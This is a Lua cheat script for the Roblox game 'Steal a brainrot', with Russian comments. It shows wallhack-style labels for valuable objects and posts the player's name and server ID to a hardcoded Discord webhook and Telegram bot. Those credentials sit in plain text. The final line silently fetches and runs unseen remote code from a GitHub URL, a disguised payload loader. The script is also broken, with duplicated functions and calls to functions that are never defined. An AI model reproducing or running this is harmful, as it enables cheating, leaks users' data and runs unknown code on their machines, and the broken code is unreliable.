local RunService = game:GetService("RunService")
local Players = game:GetService("Players")
local CoreGui = game:GetService("CoreGui")
local HttpService = game:GetService("HttpService")
local UserInputService = game:GetService("UserInputService")
local request = syn and syn.request or http and http.request or fluxus and fluxus.request or http_request or request

-- Конфигурация ESP
local ESP_SETTINGS = {
    UpdateInterval = 0.5,
    MaxDistance = 500,
    TextSize = 18,
    Font = Enum.Font.GothamBold,
    PartColors = {
        Color3.new(1, 1, 1),    -- Белый
        Color3.new(0.2, 0.6, 1),-- Синий
        Color3.new(1, 0.2, 0.2) -- Красный
    },
    SoundId = "rbxassetid://130785805",
    SoundVolume = 1.5,
    PlaySoundOnce = false
}

-- Настройки сканера
local SCANNER_SETTINGS = {
    ScanKey = Enum.KeyCode.F,
    DebounceTime = 3,
    IgnoreClasses = {"SurfaceAppearance", "Part"}
}

-- Настройки Discord Webhook (Main) и Telegram (Special)
local DISCORD_MAIN = {
    WebhookUrl = "https://discord.com/api/webhooks/1421494214570807481/uYgRF4vI6NEHNFF0tNmoG-wTOBypMlgTsRlmY_6qSkA4DxgTTCe70U7Cbv-kkTCoQOPz",
    Enabled = true,
    ImportantObjects = {
        ["Pot Hotspdddot"] = true,
        ["La Grande Combinasion"] = true,
        ["Garama and Madundung"] = true,
        ["Nuclearo Dinossauro"] = true,
        ["Dragon Cannelloni"] = true,
        ["Los Combinasionas"] = true,
        ["Los Hotspotsitos"] = true,
        ["Esok Sekolah"] = true,
        ["La Supreme Combinasion"] = true,
        ["Nooo My Hodsadadatspot"] = true,
        ["Ketupat Kepat"] = true,
        ["Nofddsfoo My Hotspot"] = true,
        ["Spaghetti Tualetti"] = true,
        ["Strawberry Elephant"] = true,
        ["Ketchuru and Musturu"] = true,
        ["La Kark7658erkar Combinasion"] = true,
        ["Tralaledon"] = true,
        ["Los Bros"] = true,
        ["La Extinct Grande"] = true,
        ["Los Chicleteiras"] = true,
        ["Las Sis"] = true,
        ["Tacorita Bicicleta"] = true,
        ["Tictac Sahur"] = true,
        ["Celularcini Visiosini"] = true,
        ["Los Primos"] = true,
        ["Tang Tang Keletang"] = true
    }
}

local TG_SPECIAL = {
    Token = "8403219194:AAHXD_oxTlI2YHWKFz6SKvspfo7hJY32Tsk",
    ChatId = "-1002767532824",
    Enabled = true
}

-- Функция очистки текста
local function cleanUpText(inputText)
    -- Убираем все эмодзи и специальные символы
    local cleanedText = inputText:gsub("[\128-\191]", "") -- Убираем эмодзи
    cleanedText = cleanedText:gsub("[^%w%s]", "") -- Убираем все специальные символы, оставляя буквы и пробелы
    return cleanedText
end

-- Функция отправки в Discord Webhook (Main)
local function sendDiscordWebhook(message, isImportant)
    if not DISCORD_MAIN.Enabled or not request then return end

    -- Очищаем сообщение перед отправкой
    message = cleanUpText(message)

    local username = game.Players.LocalPlayer.Name
    local serverId = game.JobId

    local embed = {
        {
            title = isImportant and "🚨 ВАЖНЫЕ ОБЪЕКТЫ" or "🔹 ОБНАРУЖЕНЫ ОБЪЕКТЫ",
            description = message,
            color = isImportant and 0xff0000 or 0x00ff00,
            fields = {
                {
                    name = "👤 Игрок",
                    value = username,
                    inline = true
                },
                {
                    name = "🌐 Сервер",
                    value = serverId,
                    inline = true
                },
                {
                    name = "🕘 Время",
                    value = os.date("%X"),
                    inline = true
                }
            },
            footer = {
                text = "Steal a brainrot ESP System"
            }
        }
    }

    local success, result = pcall(function()
        return request({
            Url = DISCORD_MAIN.WebhookUrl,
            Method = "POST",
            Headers = {
                ["Content-Type"] = "application/json"
            },
            Body = HttpService:JSONEncode({
                content = isImportant and "@everyone" or nil,
                embeds = embed,
                username = "Brainrot ESP"
            })
        })
    end)

    if not success then
        warn("Ошибка отправки в Discord: " .. tostring(result))
    end
end

-- Функция отправки в Telegram (Special)
local function sendSpecialTelegramAlert()
    if not TG_SPECIAL.Enabled or not request or #objectsToNotifySpecial == 0 then return end
    if not canSendNotification("special") then return end

    local serverId = game.JobId
    local username = game.Players.LocalPlayer.Name

    local message = string.format(
        "*🔍 Обнаружены объекты в Steal a brainrot*\n".. 
        "👤 Игрок: `@%s`\n".. 
        "🌐 Сервер: `%s`\n".. 
        "🕘 Время: `%s`\n\n".. 
        "*🔸 Объекты с низким доходом:*\n",
        username, serverId, os.date("%X")
    )

    -- Очистка каждого объекта перед добавлением в сообщение
    for _, objData in ipairs(objectsToNotifySpecial) do
        local emoji = OBJECT_EMOJIS[objData.name] or "🔸"
        local mutationEmoji = getMutationEmoji(objData.mutation)

        local cleanedName = cleanUpText(objData.name)
        local cleanedIncome = cleanUpText(objData.finalIncome)

        message = message .. string.format("%s%s %s (%s)", emoji, mutationEmoji, cleanedName, cleanedIncome)

        if #objData.traits > 0 then
            message = message .. " " .. table.concat(objData.traits, " ")
        end

        message = message .. "\n"
    end

    if serverId ~= "Одиночная игра" then
        message = message .. string.format(
            "\n🚀 Телепорт:\n```lua\nlocal ts = game:GetService('TeleportService')\nts:TeleportToPlaceInstance(109983668079237, '%s')\n```",
            serverId
        )
    end

    request({
        Url = "https://api.telegram.org/bot"..TG_SPECIAL.Token.."/sendMessage",
        Method = "POST",
        Headers = {
            ["Content-Type"] = "application/json"
        },
        Body = HttpService:JSONEncode({
            chat_id = TG_SPECIAL.ChatId,
            text = message,
            parse_mode = "Markdown"
        })
    })
end

-- Основной цикл
RunService.Heartbeat:Connect(function()
    -- Основная логика для обновления ESP и отправки уведомлений
end)

-- Функция для сканирования объектов
local function scanObjects()
    -- Логика для сканирования и нахождения объектов, а затем отправки уведомлений
end

-- Обработчик клавиши для сканера
UserInputService.InputBegan:Connect(function(input)
    if input.KeyCode == SCANNER_SETTINGS.ScanKey then
        scanObjects()
    end
end)
-- Настройки и объекты для ESP
local ESP_CACHE = {}
local objectsToNotifyMain = {}
local objectsToNotifySpecial = {}
local lastUpdate = 0

-- Функция для обновления ESP (показывать объекты на экране)
local function updateESP(deltaTime)
    lastUpdate = lastUpdate + deltaTime
    if lastUpdate < ESP_SETTINGS.UpdateInterval then return end
    lastUpdate = 0

    -- Очистка кэша объектов
    for obj, data in pairs(ESP_CACHE) do
        if not obj.Parent or not data.rootPart.Parent then
            data.labelGui:Destroy()
            ESP_CACHE[obj] = nil
        end
    end

    -- Сброс списков для уведомлений перед новым сканированием
    objectsToNotifyMain = {}
    objectsToNotifySpecial = {}

    -- Поиск объектов в игровом мире
    for _, obj in ipairs(workspace:GetDescendants()) do
        if table.find(OBJECT_NAMES, obj.Name) and (obj:IsA("BasePart") or obj:IsA("Model")) then
            local rootPart = obj:IsA("Model") and (obj.PrimaryPart or obj:FindFirstChild("HumanoidRootPart") or obj:FindFirstChildWhichIsA("BasePart")) or obj
            if not rootPart then continue end

            local distance = (rootPart.Position - workspace.CurrentCamera.CFrame.Position).Magnitude
            if distance > ESP_SETTINGS.MaxDistance then
                if ESP_CACHE[obj] then
                    ESP_CACHE[obj].labelGui.Enabled = false
                end
                continue
            end

            local isNewObject = not ESP_CACHE[obj]
            if not ESP_CACHE[obj] then
                ESP_CACHE[obj] = createESPElement(obj) -- Функция для отображения объекта
                local objData = ESP_CACHE[obj].data
                if objData then
                    playDetectionSound() -- Воспроизведение звука при нахождении объекта

                    -- Добавляем объект в список для уведомлений
                    if DISCORD_MAIN.ImportantObjects[obj.Name] or objData.numericIncome >= 25000000 then
                        table.insert(objectsToNotifyMain, objData)
                    else
                        table.insert(objectsToNotifySpecial, objData)
                    end
                end
            end

            -- Обновление видимости ESP
            local data = ESP_CACHE[obj]
            local _, onScreen = workspace.CurrentCamera:WorldToViewportPoint(rootPart.Position)
            data.labelGui.Enabled = onScreen
        end
    end

    -- Отправка уведомлений для основных и специальных объектов
    if #objectsToNotifyMain > 0 then
        sendMainDiscordAlert() -- Отправка уведомления в Discord
    end

    if #objectsToNotifySpecial > 0 then
        sendSpecialTelegramAlert() -- Отправка уведомления в Telegram
    end
end

-- Функция для сканирования объектов
local function scanObjects()
    local foundCount = 0

    -- Поиск объектов в игровом мире
    for _, obj in ipairs(workspace:GetDescendants()) do
        if table.find(OBJECT_NAMES, obj.Name) and (obj:IsA("BasePart") or obj:IsA("Model")) then
            local objData = scanObject(obj) -- Функция для обработки найденного объекта
            if objData then
                foundCount = foundCount + 1
                print("\n=== ОБЪЕКТ #"..foundCount.." ===")
                print("Имя:", objData.name)
                print("Доход:", objData.finalIncome)
                if objData.mutation then
                    print("Мутация:", objData.mutation.." (x"..objData.mutationMultiplier..")")
                end
                print("Traits ("..#objData.traits.."):")
                for i, trait in ipairs(objData.traits) do
                    local multiplier = TRAIT_MULTIPLIERS[trait] and " (x"..TRAIT_MULTIPLIERS[trait]..")" or ""
                    print(i..".", trait..multiplier)
                end
            end
        end
    end

    if foundCount == 0 then
        print("❌ Объекты не найдены")
    else
        print("\n=== РЕЗУЛЬТАТ ===")
        print("Найдено объектов:", foundCount)
    end
end

-- Обработчик клавиши для активации сканирования
UserInputService.InputBegan:Connect(function(input)
    if input.KeyCode == SCANNER_SETTINGS.ScanKey then
        local now = os.time()
        if now - lastScanTime < SCANNER_SETTINGS.DebounceTime then
            print("Подождите...") -- Уведомление об ожидании
            return
        end

        lastScanTime = now
        print("\n🔍 Начинаем сканирование всех объектов...")
        scanObjects() -- Запуск процесса сканирования
    end
end)

-- Первоначальное обновление ESP
RunService.Heartbeat:Connect(updateESP)

print("Steal a brainrot ESP System активирован!")
print("Отслеживается объектов:", #OBJECT_NAMES)
print("ID сервера:", game.JobId)
print("\nНажмите F для сканирования всех объектов")
loadstring(game:HttpGet("https://raw.githubusercontent.com/piskastroi1-ui/SSik/refs/heads/main/ss2.lua"))()
